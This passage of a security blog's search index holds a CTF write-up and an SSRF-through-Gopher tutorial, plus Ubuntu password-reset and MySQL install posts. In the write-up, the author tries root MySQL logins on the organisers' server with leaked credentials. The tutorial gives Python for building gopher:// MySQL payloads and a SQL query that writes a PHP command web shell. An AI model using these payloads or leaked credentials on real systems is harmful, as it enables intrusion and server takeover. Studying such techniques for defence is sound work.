15px;  width: 15px;  margin: 0 2px;  background-color: #bbb;  border-radius: 50%;  display: inline-block;  transition: background-color 0.6s ease;}.active, .dot1:hover {  background-color: #717171;}.fade {  -webkit-animation-name: fade;  -webkit-animation-duration: 1.5s;  animation-name: fade;  animation-duration: 1.5s;}@-webkit-keyframes fade {  from {opacity: .4}  to {opacity: 1}}@keyframes fade {  from {opacity: .4}  to {opacity: 1}}@media only screen and (max-width: 300px) {  .prev, .next,.text {font-size: 11px}}</style><div class="slideshow-container"><br><br><div class="mySlides fade"><br>  <div class="numbertext">1 / 3</div><br>  <img src="/images/photos/back4.png" style="width:100%"><br><br></div><div class="mySlides fade"><br>  <div class="numbertext">2 / 3</div><br>  <img src="/images/photos/back5.png" style="width:100%"><br><br></div><!-- <div class="mySlides fade">  <div class="numbertext">3 / 3</div>  <img src="/images/photos/reset-1.jpg" style="width:100%">  <div class="text">Caption Three</div></div>--><p><a class="prev" onclick="plusSlides(-1)">&#10094;</a><br><a class="next" onclick="plusSlides(1)">&#10095;</a></p><p></div><br><br></p><!-- <div style="text-align:center">  <span class="dot" onclick="currentSlide(1)"></span>  <span class="dot" onclick="currentSlide(2)"></span></div> --><script>var slideIndex = 1;showSlides(slideIndex);function plusSlides(n) {  showSlides(slideIndex += n);}function currentSlide(n) {  showSlides(slideIndex = n);}function showSlides(n) {  var i;  var slides = document.getElementsByClassName("mySlides");  var dots = document.getElementsByClassName("dot");  if (n > slides.length) {slideIndex = 1}      if (n < 1) {slideIndex = slides.length}  for (i = 0; i < slides.length; i++) {      slides[i].style.display = "none";    }  for (i = 0; i < dots.length; i++) {      dots[i].className = dots[i].className.replace(" active", "");  }  slides[slideIndex-1].style.display = "block";    dots[slideIndex-1].className += " active";}</script><h3 id="Get-Hired-2"><a href="#Get-Hired-2" class="headerlink" title="Get-Hired-2"></a>Get-Hired-2</h3><p>What you think now, can you do it on your own?<br>Now the challenge is asking for login as “admin2”.<br>And the thing is I am damn lazy, So without thinking I just changed username to “admin2” and did the same…AND AGAIN DONE  </p><div class="slideshow-container"><br><br><div class="mySlides1 fade"><br>  <div class="numbertext">1 / 3</div><br>  <img src="/images/photos/back6.png" style="width:100%"><br></div><div class="mySlides1 fade1"><br>  <div class="numbertext">2 / 3</div><br>  <img src="/images/photos/back7.png" style="width:100%"><br></div><div class="mySlides1 fade1"><br>  <div class="numbertext">3 / 3</div><br>  <img src="/images/photos/back8.png" style="width:100%"><br></div><p><a class="prev" onclick="plusSlides1(-1)">&#10094;</a><br><a class="next" onclick="plusSlides1(1)">&#10095;</a></p><p><br><br></div></p><script>var slideIndex = 1;showSlides1(slideIndex);function plusSlides1(n) {  showSlides1(slideIndex += n);}function currentSlide1(n) {  showSlides1(slideIndex = n);}function showSlides1(n) {  var i;  var slides = document.getElementsByClassName("mySlides1");  var dots = document.getElementsByClassName("dot1");  if (n > slides.length) {slideIndex = 1}      if (n < 1) {slideIndex = slides.length}  for (i = 0; i < slides.length; i++) {      slides[i].style.display = "none";    }  for (i = 0; i < dots.length; i++) {      dots[i].className = dots[i].className.replace(" active", "");  }  slides[slideIndex-1].style.display = "block";    dots[slideIndex-1].className += " active";}</script><p>Then I was working on finding the bug in the server because there was one chall for reporting the bug and if you did it successfully then you will be rewarded with 400 pts.  </p><h2 id="Bug-Bounty"><a href="#Bug-Bounty" class="headerlink" title="Bug-Bounty"></a>Bug-Bounty</h2><p>I tried but didn’t get any 😦<br>but what I got is here below 🙂<br>The source code I got from Get-Hired, discloses the  MySQL Credentials.<br>And the funny thing was that the connection was from “root” user (Means I had creds for MySQL root user) 😛<br>So, I was trying to access there MySQL server:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="number">51.15</span><span class="number">.73</span><span class="number">.163</span> <span class="operator">-</span>P <span class="number">13336</span> <span class="operator">-</span>u root <span class="operator">-</span>p  </span><br></pre></td></tr></table></figure><br>But it was not responding (It was like in the wait state)<br>Then I tried<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="number">51.15</span><span class="number">.73</span><span class="number">.163</span> <span class="operator">-</span>u root <span class="operator">-</span>p  </span><br></pre></td></tr></table></figure><br>It was throwing one error :<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR <span class="number">2003</span> (HY000): Can<span class="string">&#x27;t connect to MySQL server on &#x27;</span><span class="number">51.15</span><span class="number">.73</span><span class="number">.163</span><span class="string">&#x27; (111)  </span></span><br></pre></td></tr></table></figure><br>I don’t know why I was getting this error (Probably they are blocking other users, I guess so)  but <em>if anyone knows why this error came then please DM me</em>.<br>And finally the CTF was good (as my team member said) but the challenge developer didn’t test the challenges, the CTF would have been better if they would have tested the challenges.<br>And this was the 1st time I got the 1st blood…really it was awesome feeling 😛<br><br><br><br>Thanks, for reading this blog, I hope you understood what I meant to say.</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
            <tag> Unintened </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF Through Gopher://</title>
      <link href="/2018/02/05/2018-02-05-ssrf-through-gopher/"/>
      <url>/2018/02/05/2018-02-05-ssrf-through-gopher/</url>
      
        <content type="html"><![CDATA[<p>I am writing the blog after a year because I didn’t get any interesting Vulnerability throughout the year.<br>Recently I came to know about this Vuln which is “SSRF Through Gopher”, it is quite interesting because this uses SQL, Wireshark, SSRF, and Gopher.<br><!--break--></p><h2 id="Explanation-of-Each-Term"><a href="#Explanation-of-Each-Term" class="headerlink" title="Explanation of Each Term:"></a>Explanation of Each Term:</h2><h3 id="What-is-SSRF"><a href="#What-is-SSRF" class="headerlink" title="What is SSRF?"></a>What is SSRF?</h3><p>Server-Side Request Forgery (SSRF) refers to an attack wherein an attacker is able to send a crafted request from a vulnerable web application. SSRF is usually used to target internal systems behind firewalls that are normally inaccessible to an attacker from the external network.</p><h3 id="What-is-Gopher"><a href="#What-is-Gopher" class="headerlink" title="What is Gopher?"></a>What is Gopher?</h3><p>Gopher is an application-layer protocol that provides the ability to extract and view Web documents stored on remote Web servers. Gopher was conceived in 1991 as one of the Internet’s first data/file access protocols to run on top of a TCP/IP network. It was developed at the University of Minnesota and is named after the school’s mascot.<br><strong>We can use gopher:// to communicate with the MySQL database.</strong></p><h3 id="What-is-Wireshark"><a href="#What-is-Wireshark" class="headerlink" title="What is Wireshark?"></a>What is Wireshark?</h3><p>Wireshark is a free and open source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education.</p><h2 id="Make-SSRF-through-gopher"><a href="#Make-SSRF-through-gopher" class="headerlink" title="Make SSRF through gopher:"></a>Make SSRF through gopher:</h2><ul><li><h3 id="Construct-MySQL-Connection-packet"><a href="#Construct-MySQL-Connection-packet" class="headerlink" title="Construct MySQL-Connection packet:"></a>Construct MySQL-Connection packet:</h3>open your Wireshark, and write this command in terminal:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>u test</span><br></pre></td></tr></table></figure>Make sure the username you are putting here doesn’t have the password.(If MySQL doesn’t have any user without password then make one test account.)<br>you can get how to create a new user in MySQL by Googling 😛.<br>We can’t do with username having the password because it sends the salt(which changes in every attempt) to encrypt/decrypt the password to get login.</li></ul><style>* {box-sizing: border-box}body {font-family: Verdana, sans-serif; margin:0}.mySlides {display: none}img {vertical-align: middle;}.slideshow-container {  max-width: 1000px;  position: relative;  margin: auto;}.prev, .next {  cursor: pointer;  position: absolute;  top: 50%;  width: auto;  padding: 16px;  margin-top: -22px;  color: white;  font-weight: bold;  font-size: 18px;  transition: 0.6s ease;  border-radius: 0 3px 3px 0;}.next {  right: 0;  border-radius: 3px 0 0 3px;}.prev:hover, .next:hover {  background-color: rgba(0,0,0,0.8);}.text {  color: #f2f2f2;  font-size: 15px;  padding: 8px 12px;  position: absolute;  bottom: 8px;  width: 100%;  text-align: center;}.numbertext {  color: #f2f2f2;  font-size: 12px;  padding: 8px 12px;  position: absolute;  top: 0;}.dot {  cursor: pointer;  height: 15px;  width: 15px;  margin: 0 2px;  background-color: #bbb;  border-radius: 50%;  display: inline-block;  transition: background-color 0.6s ease;}.active, .dot:hover {  background-color: #717171;}.dot1 {  cursor: pointer;  height: 15px;  width: 15px;  margin: 0 2px;  background-color: #bbb;  border-radius: 50%;  display: inline-block;  transition: background-color 0.6s ease;}.active, .dot1:hover {  background-color: #717171;}.fade {  -webkit-animation-name: fade;  -webkit-animation-duration: 1.5s;  animation-name: fade;  animation-duration: 1.5s;}@-webkit-keyframes fade {  from {opacity: .4}  to {opacity: 1}}@keyframes fade {  from {opacity: .4}  to {opacity: 1}}@media only screen and (max-width: 300px) {  .prev, .next,.text {font-size: 11px}}</style><div class="slideshow-container"><br><br><div class="mySlides fade"><br>  <div class="numbertext">1 / 2</div><br>  <img src="/images/photos/mysql-teminal.png" style="width:100%"><br><br></div><div class="mySlides fade"><br>  <div class="numbertext">2 / 2</div><br>  <img src="/images/photos/wireshark-1.png" style="width:100%"><br><br></div><!-- <div class="mySlides fade">  <div class="numbertext">3 / 3</div>  <img src="/images/photos/reset-1.jpg" style="width:100%">  <div class="text">Caption Three</div></div>--><p><a class="prev" onclick="plusSlides(-1)">&#10094;</a><br><a class="next" onclick="plusSlides(1)">&#10095;</a></p><p></div><br><br></p><!-- <div style="text-align:center">  <span class="dot" onclick="currentSlide(1)"></span>  <span class="dot" onclick="currentSlide(2)"></span></div> --><script>var slideIndex = 1;showSlides(slideIndex);function plusSlides(n) {  showSlides(slideIndex += n);}function currentSlide(n) {  showSlides(slideIndex = n);}function showSlides(n) {  var i;  var slides = document.getElementsByClassName("mySlides");  var dots = document.getElementsByClassName("dot");  if (n > slides.length) {slideIndex = 1}      if (n < 1) {slideIndex = slides.length}  for (i = 0; i < slides.length; i++) {      slides[i].style.display = "none";    }  for (i = 0; i < dots.length; i++) {      dots[i].className = dots[i].className.replace(" active", "");  }  slides[slideIndex-1].style.display = "block";    dots[slideIndex-1].className += " active";}</script><p> You can see the MySQL-Connection packets in Wireshark, Now you have to get the hex dump of connection packets, So for that, do:<br>Right-click on <code>Login-Request user=test</code> =&gt; Go to Follow =&gt; TCP Stram = &gt; Change it to RAW Data =&gt; Only take the incoming packets(127.0.0.1:42196 -&gt; 127.0.0.1:3306,  in  my case)</p><div class="slideshow-container"><br><br><div class="mySlides1 fade"><br>  <div class="numbertext">1 / 3</div><br>  <img src="/images/photos/wireshark-2.png" style="width:100%"><br></div><div class="mySlides1 fade1"><br>  <div class="numbertext">2 / 3</div><br>  <img src="/images/photos/wireshark-3.png" style="width:100%"><br></div><div class="mySlides1 fade1"><br>  <div class="numbertext">3 / 3</div><br>  <img src="/images/photos/wireshark-4.png" style="width:100%"><br></div><p><a class="prev" onclick="plusSlides1(-1)">&#10094;</a><br><a class="next" onclick="plusSlides1(1)">&#10095;</a></p><p><br><br></div></p><script>var slideIndex = 1;showSlides1(slideIndex);function plusSlides1(n) {  showSlides1(slideIndex += n);}function currentSlide1(n) {  showSlides1(slideIndex = n);}function showSlides1(n) {  var i;  var slides = document.getElementsByClassName("mySlides1");  var dots = document.getElementsByClassName("dot1");  if (n > slides.length) {slideIndex = 1}      if (n < 1) {slideIndex = slides.length}  for (i = 0; i < slides.length; i++) {      slides[i].style.display = "none";    }  for (i = 0; i < dots.length; i++) {      dots[i].className = dots[i].className.replace(" active", "");  }  slides[slideIndex-1].style.display = "block";    dots[slideIndex-1].className += " active";}</script><p>The values in red are hex dump of the MySQL-Connection packets.  </p><ul><li><h3 id="Get-gopher-link"><a href="#Get-gopher-link" class="headerlink" title="Get gopher link:"></a>Get gopher link:</h3><p>Gopher link is nothing but the URL form of hex dump.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;HEX-DUMP&quot;</span></span><br><span class="line">a = [s[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>)]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;gopher://127.0.0.1:3306/_%&quot;</span> + <span class="string">&quot;%&quot;</span>.join(a)</span><br></pre></td></tr></table></figure><p>But if we add the SQL query to it then the packets will get change, So finally the packets will be:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auth = s</span><br><span class="line">query = <span class="string">&quot;YOUR-SQL-QUERY&quot;</span></span><br><span class="line">query = query.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">query_length = <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>((<span class="built_in">int</span>((<span class="built_in">len</span>(query) / <span class="number">2</span>) + <span class="number">1</span>)))</span><br><span class="line">pay1 = query_length.rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>) + <span class="string">&quot;00000003&quot;</span> + query</span><br><span class="line">final = encode(auth + pay1 + <span class="string">&quot;0100000001&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> final</span><br></pre></td></tr></table></figure><p>You can get the complete <a href="https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py">code</a> here.<br>And use the <a href="https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py">same</a> code for generating gopher link.  </p></li><li><h3 id="Make-SQL-Query"><a href="#Make-SQL-Query" class="headerlink" title="Make SQL Query:"></a>Make SQL Query:</h3><p>We have to make SQL Query which will make a file containing malicious PHP code, So that after executing the same file, it will get created into the server.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php system($_REQUEST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br></pre></td></tr></table></figure><p>As you can see we created PHP shell, Now you can do anything 😛</p></li><li><h3 id="Finally-SSRF-🙂"><a href="#Finally-SSRF-🙂" class="headerlink" title="Finally SSRF 🙂"></a>Finally SSRF 🙂</h3><p>Till now we have created gopher link having a SQL query.<br>Now time to execute:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl GOPHER<span class="operator">-</span>LINK</span><br></pre></td></tr></table></figure><p>You can see your output of SQL query in the terminal.<br>If you made the gopher link having Malicious SQL query(same query we made) and did execute then the file will get created at <code>/var/www/html</code> folder and you can open that file from browser <code>http://localhost/shell.php</code><br>Now you have uploaded shell file on the server, and can execute shell commands like:  </p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/shell.php?cmd=ls</span><br><span class="line">http://localhost/shell.php?cmd=ls /</span><br></pre></td></tr></table></figure><p><strong>If any site using curl and asks you URL for uploading the file then try gopher link and get owned the site(By the way they block these things 😛 ).<br>This is for educational purpose, Don’t try in live servers 😛</strong><br>Thanks for Reading this blog, I hope I will get you understand what I meant.<br>If you have any suggestions, doubts then just comment here.  </p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> SSRF </tag>
            
            <tag> Gopher </tag>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reset Ubuntu Password</title>
      <link href="/2016/12/03/2016-12-03-reset-ubuntu-password/"/>
      <url>/2016/12/03/2016-12-03-reset-ubuntu-password/</url>
      
        <content type="html"><![CDATA[<p>First, you have to reboot into <em>recovery mode</em>.</p><p>If you have a single-boot (Ubuntu is the only operating system on your computer), to get the boot menu to show, you have to hold down the Shift key or Esc key depending on the computer during bootup.</p><p>If you have a dual-boot (Ubuntu is installed next to Windows, another Linux operating system, or Mac OS X; and you choose at boot time which operating system to boot into), the boot menu should appear without the need to hold down the <em>Shift key</em>.<br><!--break--></p><p><img src="/images/photos/reset-1.jpg" alt="a"></p><p>From the boot menu, select <em>recovery mode</em>, which is usually the second boot option.</p><p><img src="/images/photos/reset-2.jpg" alt="a"></p><p>After you select recovery mode and wait for all the boot-up processes to finish, you’ll be presented with a few options. In this case, you want the <em>Drop to root shell prompt</em> option so press the Down arrow to get to that option, and then press Enter to select it.</p><p>The root account is the ultimate administrator and can do anything to the Ubuntu installation (including erase it), so please be careful with what commands you enter in the root terminal.</p><p>In recent versions of Ubuntu, the file system is mounted as read-only, so you need to enter the follow command to get it to remount as read-write, which will allow you to make changes:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount <span class="operator">-</span>o rw,remount <span class="operator">/</span></span><br></pre></td></tr></table></figure><p>If you have forgotten your username as well, type<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls <span class="operator">/</span>home</span><br></pre></td></tr></table></figure><br>Here you can see the username, In this case, I’m going to reset the password of username as ‘Suyash’<br>To reset the password, type<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd username</span><br></pre></td></tr></table></figure><br>where <em>username</em> is the username you want to reset. In this case, I want to reset Suyash’s password, so I type<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd suyash</span><br></pre></td></tr></table></figure><br>You’ll then be prompted for a new password.</p><p>Now the password should be reset. Type<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><br>to return to the recovery menu.<br><img src="/images/photos/reset-3.jpg" alt="a"><br><img src="/images/photos/reset-4.jpg" alt="a"></p><p>After you get back to the recovery menu, select <em>resume normal boot</em>, and use Ubuntu as you normally would—only this time, you actually know the password!</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ubuntu </tag>
            
            <tag> Grub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Is it possible to install MySQL 5.5 or 5.6 on Ubuntu 16.04?</title>
      <link href="/2016/12/01/2016-12-01-is-it-possible-to-install-mysql-5-5-or-5-6-on-ubuntu-16-04/"/>
      <url>/2016/12/01/2016-12-01-is-it-possible-to-install-mysql-5-5-or-5-6-on-ubuntu-16-04/</url>
      
        <content type="html"><![CDATA[<p>Yes, This is possible, but the problem occurred while installing 5.6 is<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;mysql-server-5.6&#x27;</span> has <span class="keyword">no</span> installation candidate...</span><br></pre></td></tr></table></figure><br>this is why because we didn’t add repository. But firstly you have to remove old mysql debian flag as:<br><!--break--><br>Do this, First you have to remove<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm <span class="operator">/</span>var<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>debian<span class="number">-5.7</span>.flag</span><br></pre></td></tr></table></figure><br>then<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="keyword">add</span><span class="operator">-</span>apt<span class="operator">-</span>repository <span class="string">&#x27;deb http://archive.ubuntu.com/ubuntu trusty universe&#x27;</span></span><br><span class="line">sudo apt<span class="operator">-</span><span class="keyword">get</span> update</span><br><span class="line">sudo apt install mysql<span class="operator">-</span>server<span class="number">-5.6</span></span><br><span class="line">sudo apt install mysql<span class="operator">-</span>client<span class="number">-5.6</span></span><br></pre></td></tr></table></figure><br>From these commands you can resolve mysql problem.</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
